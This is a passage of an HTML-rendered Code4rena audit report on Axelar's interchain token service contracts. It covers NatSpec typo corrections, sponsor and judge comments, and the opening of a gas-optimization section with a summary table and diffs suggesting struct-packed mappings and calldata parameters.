class=\"mtk1\"> </span><span class=\"mtk12\">appropriate</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> </span><span class=\"mtk4\">of</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokens</span><span class=\"mtk1\"> </span><span class=\"mtk12\">from</span><span class=\"mtk1\"> </span><span class=\"mtk12\">the</span><span class=\"mtk1\"> </span><span class=\"mtk12\">user</span><span class=\"mtk1\">.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                                              -&gt; </span><span class=\"mtk12\">a</span><span class=\"mtk1\"> </span><span class=\"mtk12\">cross</span><span class=\"mtk1\">-</span><span class=\"mtk12\">chain</span><span class=\"mtk1\"> ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">159</span><span class=\"mtk1\">:     * @</span><span class=\"mtk12\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">the</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> </span><span class=\"mtk4\">of</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\"> </span><span class=\"mtk12\">actually</span><span class=\"mtk1\"> </span><span class=\"mtk12\">given</span><span class=\"mtk1\">, </span><span class=\"mtk12\">which</span><span class=\"mtk1\"> </span><span class=\"mtk12\">will</span><span class=\"mtk1\"> </span><span class=\"mtk12\">onle</span><span class=\"mtk1\"> </span><span class=\"mtk12\">be</span><span class=\"mtk1\"> </span><span class=\"mtk12\">differen</span><span class=\"mtk1\"> </span><span class=\"mtk12\">than</span><span class=\"mtk1\"> </span><span class=\"mtk8\">`amount`</span><span class=\"mtk1\"> </span><span class=\"mtk4\">in</span><span class=\"mtk1\"> </span><span class=\"mtk12\">cases</span><span class=\"mtk1\"> </span><span class=\"mtk12\">where</span><span class=\"mtk1\"> </span><span class=\"mtk12\">the</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\"> </span><span class=\"mtk12\">takes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">some</span><span class=\"mtk1\"> </span><span class=\"mtk12\">on</span><span class=\"mtk1\">-</span><span class=\"mtk12\">transfer</span><span class=\"mtk1\"> </span><span class=\"mtk12\">fee</span><span class=\"mtk1\">.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                                                               -&gt; </span><span class=\"mtk12\">only</span><span class=\"mtk1\"> -&gt; </span><span class=\"mtk12\">different</span></span></span></code></pre>\n<h3 id=\"tokenmanagerproxysol-1\" style=\"position:relative;\"><a href=\"#tokenmanagerproxysol-1\" aria-label=\"tokenmanagerproxysol 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><code>TokenManagerProxy.sol</code>:</h3>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/proxies/TokenManagerProxy.sol#L73\">https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/proxies/TokenManagerProxy.sol#L73</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"53\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">its</span><span class=\"mtk1\">/</span><span class=\"mtk12\">proxies</span><span class=\"mtk1\">/</span><span class=\"mtk12\">TokenManagerProxy</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">73</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">implementaion_</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">implementation</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                -&gt; </span><span class=\"mtk12\">implementation</span></span></span></code></pre>\n<h3 id=\"iinterchaintokenexecutablesol-iinterchaintokenexpressexecutablesol\" style=\"position:relative;\"><a href=\"#iinterchaintokenexecutablesol-iinterchaintokenexpressexecutablesol\" aria-label=\"iinterchaintokenexecutablesol iinterchaintokenexpressexecutablesol permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><code>IInterchainTokenExecutable.sol</code>, <code>IInterchainTokenExpressExecutable.sol</code>:</h3>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interfaces/IInterchainTokenExecutable.sol#L16\">https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interfaces/IInterchainTokenExecutable.sol#L16</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"54\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">its</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interfaces</span><span class=\"mtk1\">/</span><span class=\"mtk12\">IInterchainTokenExecutable</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">16</span><span class=\"mtk1\">:     * @</span><span class=\"mtk12\">param</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\"> </span><span class=\"mtk12\">the</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\"> </span><span class=\"mtk4\">of</span><span class=\"mtk1\"> </span><span class=\"mtk12\">the</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\"> </span><span class=\"mtk12\">manager</span><span class=\"mtk1\"> </span><span class=\"mtk12\">managing</span><span class=\"mtk1\"> </span><span class=\"mtk12\">the</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">. </span><span class=\"mtk12\">You</span><span class=\"mtk1\"> </span><span class=\"mtk12\">can</span><span class=\"mtk1\"> </span><span class=\"mtk12\">access</span><span class=\"mtk1\"> </span><span class=\"mtk12\">it</span><span class=\"mtk8\">&#39;s address by querrying the servic</span><span class=\"mtk14\">e</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                                                                                                          -&gt; </span><span class=\"mtk12\">querying</span></span></span></code></pre>\n<p>Same in:</p>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interfaces/IInterchainTokenExpressExecutable.sol#L18\">https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interfaces/IInterchainTokenExpressExecutable.sol#L18</a></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/353#issuecomment-1700048877\">deanamiel (Axelar) commented</a>:</strong></p>\n<blockquote>\n<p>InterchainProposalExecutor is not abstract. We updated the NatSpec documentation.</p>\n<p>See PR <a href=\"https://github.com/axelarnetwork/interchain-governance-executor/pull/31\">here</a>.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/353#issuecomment-1711589395\">berndartmueller (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Excellent and thorough QA report submitted by the warden! I agree with the outlined findings and their chosen severity.</p>\n</blockquote>\n<hr>\n<h1 id=\"gas-optimizations\" style=\"position:relative;\"><a href=\"#gas-optimizations\" aria-label=\"gas optimizations permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Gas Optimizations</h1>\n<p>For this audit, 21 reports were submitted by wardens detailing gas optimizations. The <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/30\">report highlighted below</a> by <strong>Sathish9098</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/498\">Raihan</a>, <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/487\">Arz</a>, <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/485\">SAQ</a>, <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/479\">SM3_SS</a>, <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/285\">0xn006e7</a>, <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/95\">Rolezn</a>, <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/488\">naman1778</a>, <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/474\">0x11singh99</a>, <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/470\">petrichor</a>, <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/455\">ybansal2403</a>, <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/446\">SY_S</a>, <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/445\">flutter_developer</a>, <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/442\">hunter_w3b</a>, <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/404\">ReyAdmirado</a>, <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/365\">matrix_0wl</a>, <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/354\">0xAnah</a>, <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/262\">K42</a>, <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/220\">Walter</a>, <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/92\">dharma09</a>, and <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/39\">DavidGiladi</a>.</em></p>\n<h2 id=\"gas-optimization-issue-summary\" style=\"position:relative;\"><a href=\"#gas-optimization-issue-summary\" aria-label=\"gas optimization issue summary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Gas Optimization Issue Summary</h2>\n<table>\n<thead>\n<tr>\n<th>Item</th>\n<th>Issue</th>\n<th>Instances</th>\n<th>Gas Saved</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>[G-1]</td>\n<td>Multiple address mappings can be combined into a single mapping of an address to a struct, where appropriate</td>\n<td>1</td>\n<td>21018</td>\n</tr>\n<tr>\n<td>[G-2]</td>\n<td>Using <code>calldata</code> instead of <code>memory</code> for read-only arguments in external functions saves gas</td>\n<td>8</td>\n<td>2820</td>\n</tr>\n<tr>\n<td>[G-3]</td>\n<td>Avoiding the overhead of <code>bool</code> storage</td>\n<td>6</td>\n<td>100600</td>\n</tr>\n<tr>\n<td>[G-4]</td>\n<td>Avoid <code>contract existence</code> checks by using low level calls</td>\n<td>37</td>\n<td>3700</td>\n</tr>\n<tr>\n<td>[G-5]</td>\n<td>Use <code>calldata</code> pointer. Saves more gas than <code>memory</code> pointer</td>\n<td>2</td>\n<td>600 GAS (Per Iteration)</td>\n</tr>\n<tr>\n<td>[G-6]</td>\n<td><code>IF’s/require()</code> statements that check input arguments should be at the <code>top</code> of the function</td>\n<td>2</td>\n<td>300</td>\n</tr>\n<tr>\n<td>[G-7]</td>\n<td>Functions guaranteed to revert when called by normal users can be marked <code>payable</code></td>\n<td>11</td>\n<td>231</td>\n</tr>\n<tr>\n<td>[G-8]</td>\n<td>Optimize <code>names</code> to save gas</td>\n<td>27</td>\n<td>-</td>\n</tr>\n<tr>\n<td>[G-9]</td>\n<td>Default value initialization</td>\n<td>4</td>\n<td>80</td>\n</tr>\n<tr>\n<td>[G‑10]</td>\n<td>Use constants instead of <code>type(uintX).max</code></td>\n<td>7</td>\n<td>91</td>\n</tr>\n<tr>\n<td>[G‑11]</td>\n<td>Splitting <code>require()/if()</code> statements that use <code>&#x26;&#x26;</code> saves gas</td>\n<td>4</td>\n<td>52</td>\n</tr>\n<tr>\n<td>[G‑12]</td>\n<td>Caching <code>global variables</code> is more expensive than using the actual variable (use <code>msg.sender</code> instead of caching it)</td>\n<td>10</td>\n<td>-</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"g-01-multiple-address-mappings-can-be-combined-into-a-single-mapping-of-an-address-to-a-struct-where-appropriate\" style=\"position:relative;\"><a href=\"#g-01-multiple-address-mappings-can-be-combined-into-a-single-mapping-of-an-address-to-a-struct-where-appropriate\" aria-label=\"g 01 multiple address mappings can be combined into a single mapping of an address to a struct where appropriate permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-01] Multiple address mappings can be combined into a single mapping of an address to a struct, where appropriate</h2>\n<p>We can combine multiple mappings below into structs. We can then pack the structs by modifying the uint type for the values. This will result in cheaper storage reads since multiple mappings are accessed in functions and those values are now occupying the same storage slot, meaning the slot will become warm after the first <code>SLOAD</code>. In addition, when writing to and reading from the struct values, we will avoid a <code>Gsset (20000 gas)</code> and <code>Gcoldsload (2100 gas)</code>, since multiple struct values are now occupying the same slot.</p>\n<h3 id=\"remoteaddressvalidatorsol-1\" style=\"position:relative;\"><a href=\"#remoteaddressvalidatorsol-1\" aria-label=\"remoteaddressvalidatorsol 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><code>RemoteAddressValidator.sol</code>:</h3>\n<p>Struct can be used for <code>remoteAddressHashes</code> and <code>remoteAddresses</code> since they are using same <code>string</code> as key. Also both mapping always used together in a same functions like <code>addTrustedAddress()</code> and <code>removeTrustedAddress()</code>. So <code>struct</code> is more efficient than <code>mapping</code>. As per gas tests, this will save <code>21018 GAS</code>.</p>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/remote-address-validator/RemoteAddressValidator.sol#L15-L16\">https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/remote-address-validator/RemoteAddressValidator.sol#L15-L16</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"55\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">FILE: 2023-07-axelar/contracts/its/remote-address-validator/RemoteAddressValidator.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 15: mapping(string =&gt; bytes32) public remoteAddressHashes;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 16: mapping(string =&gt; string) public remoteAddresses;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+ struct RemoteAddressData {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    bytes32 addressHash;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    string addressString;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+ }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+ mapping(string =&gt; RemoteAddressData) public remoteAddressData;</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"56\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">FILE: Breadcrumbs2023-07-axelar/contracts/its/remote-address-validator/RemoteAddressValidator.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">15: mapping(string =&gt; bytes32) public remoteAddressHashes;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">16: mapping(string =&gt; string) public remoteAddresses;</span></span></span></code></pre>\n<h2 id=\"g-02-using-calldata-instead-of-memory-for-read-only-arguments-in-external-functions-saves-gas\" style=\"position:relative;\"><a href=\"#g-02-using-calldata-instead-of-memory-for-read-only-arguments-in-external-functions-saves-gas\" aria-label=\"g 02 using calldata instead of memory for read only arguments in external functions saves gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-02] Using <code>calldata</code> instead of <code>memory</code> for read-only arguments in external functions saves gas</h2>\n<p>Saves <code>2820 GAS</code> in 8 instances.</p>\n<p>When a function with a <code>memory</code> array is called externally, the <code>abi.decode()</code> step has to use a for-loop to copy each index of the <code>calldata</code> to the <code>memory</code> index. Each iteration of this for-loop costs at least 60 gas <code>(i.e. 60 * &#x3C;mem_array>.length)</code>. Using <code>calldata</code> directly, obliviates the need for such a loop in the contract code and runtime execution. Note that even if an interface defines a function as having memory arguments, it’s still valid for implementation contracts to use <code>calldata</code> arguments instead.</p>\n<p>If the array is passed to an internal function, which passes the array to another internal function where the array is modified and therefore memory is used in the external call, it’s still more gas-efficient to use <code>calldata</code> when the <code>external</code> function uses modifiers; since the modifiers may prevent the internal functions from being called. Structs have the same overhead as an array of length one.</p>\n<details>\n<h3 id=\"interchaintokenservicesol-2\" style=\"position:relative;\"><a href=\"#interchaintokenservicesol-2\" aria-label=\"interchaintokenservicesol 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><code>InterchainTokenService.sol</code>:</h3>\n<p><code>distributor</code> and <code>operator</code> can be <code>calldata</code> instead of <code>memory</code>: Saves <code>564 GAS</code>.</p>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/interchain-token-service/InterchainTokenService.sol#L422\">https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/interchain-token-service/InterchainTokenService.sol#L422</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"57\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">FILE: 2023-07-axelar/contracts/its/interchain-token-service/InterchainTokenService.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">417: function deployAndRegisterRemoteStandardizedToken(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">418:        bytes32 salt,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">419:        string calldata name,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">420:        string calldata symbol,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">421:        uint8 decimals,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 422:        bytes memory distributor,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+ 422:        bytes calldata distributor,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 423:        bytes memory operator,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+ 423:        bytes calldata operator,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">424:        string calldata destinationChain,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">425:        uint256 gasValue</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">426:    ) external payable notPaused {</span></span></span></code></pre>\n<h3 id=\"interchaintokenservicesol-3\" style=\"position:relative;\"><a href=\"#interchaintokenservicesol-3\" aria-label=\"interchaintokenservicesol 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><code>InterchainTokenService.sol</code>:</h3>\n<p><code>sourceChain</code>, <code>sourceAddress</code> and <code>destinationAddress</code> can be <code>calldata</code> instead of <code>memory</code>: Saves <code>846 GAS</code>.</p>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/interchain-token-service/InterchainTokenService.sol#L467\">https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/interchain-token-service/InterchainTokenService.sol#L467</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"58\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">FILE: 2023-07-axelar/contracts/its/interchain-token-service/InterchainTokenService.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">467:   function expressReceiveTokenWithData(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">468:        bytes32 tokenId,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 469:        string memory sourceChain,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+ 469:        string calldata sourceChain,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 470:        bytes memory sourceAddress,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+ 470:        bytes calldata sourceAddress,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">471:        address destinationAddress,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">472:        uint256 amount,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">473:        bytes calldata data,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">474:        bytes32 commandId</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">475:    ) external {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 506:   bytes memory destinationAddress,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+ 506:   bytes calldata destinationAddress,</span></span></span></code></pre>\n<h3 id=\"multisigbasesol\" style=\"position:relative;\"><a href=\"#multisigbasesol\" aria-label=\"multisigbasesol permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 